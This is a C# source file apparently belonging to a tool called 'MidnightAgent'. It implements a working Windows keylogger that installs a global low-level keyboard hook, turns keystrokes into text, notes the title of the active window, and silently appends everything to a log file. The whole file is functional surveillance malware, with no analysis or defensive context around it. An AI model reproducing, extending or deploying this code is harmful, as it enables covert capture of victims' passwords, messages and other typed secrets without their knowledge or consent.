using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace MidnightAgent.Utils
{
    public static class KeyloggerWorker
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_SYSKEYDOWN = 0x0104; // ALT key
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static string _logPath;

        public static void Run(string logFile)
        {
            _logPath = logFile;
            
            // Log header
            LogKey($"\n[Keylogger Started: {DateTime.Now}]\n");

            _hookID = SetHook(_proc);
            Application.Run(); // Message loop is required for hooks
            UnhookWindowsHookEx(_hookID);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Keys key = (Keys)vkCode;

                string log = "";

                // Handle special keys
                bool shift = (Control.ModifierKeys & Keys.Shift) != 0;
                bool caps = Control.IsKeyLocked(Keys.CapsLock);
                
                // Get window title
                string windowTitle = GetActiveWindowTitle();
                
                if (key == Keys.Enter) log = "\n";
                else if (key == Keys.Space) log = " ";
                else if (key == Keys.Back) log = "[BS]";
                else if (key == Keys.Tab) log = "[TAB]";
                else if (key == Keys.Escape) log = "[ESC]";
                else if (key >= Keys.D0 && key <= Keys.D9) // Numbers
                {
                    // Basic check for Shift (not perfect for all layouts but simple)
                    if (shift) 
                    {
                        string syms = ")!@#$%^&*(";
                        int idx = key - Keys.D0;
                        if(idx >= 0 && idx < syms.Length) log = syms[idx].ToString();
                    }
                    else log = ((char)key).ToString(); // 0-9
                }
                else if (key >= Keys.A && key <= Keys.Z) // Letters
                {
                     bool upper = shift ^ caps;
                     log = upper ? key.ToString() : key.ToString().ToLower();
                }
                else if (key.ToString().Contains("Oem")) // Punctuation (Simpified)
                {
                    log = ""; // Skip raw Oem names, or implement mapping if needed
                    // For simplicity, we can log raw key code if we want:
                    // log = $"[{key}]";
                }
                else
                {
                     // Non-printable
                     // log = $"[{key}]"; 
                }
                
                // Log Window Change
                if (_lastWindow != windowTitle)
                {
                    _lastWindow = windowTitle;
                    LogKey($"\n[Window: {windowTitle}]\n");
                }

                if (!string.IsNullOrEmpty(log))
                {
                    LogKey(log);
                }
                else if (!key.ToString().Contains("Oem") && !key.ToString().Contains("Shift") && !key.ToString().Contains("Control") && !key.ToString().Contains("Alt"))
                {
                     // Log other printable keys roughly
                     // LogKey($"[{key}]");
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static string _lastWindow = "";

        private static void LogKey(string txt)
        {
            try
            {
                File.AppendAllText(_logPath, txt);
            }
            catch { }
        }

        // --- Win32 Import ---

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        private static string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }
    }
}
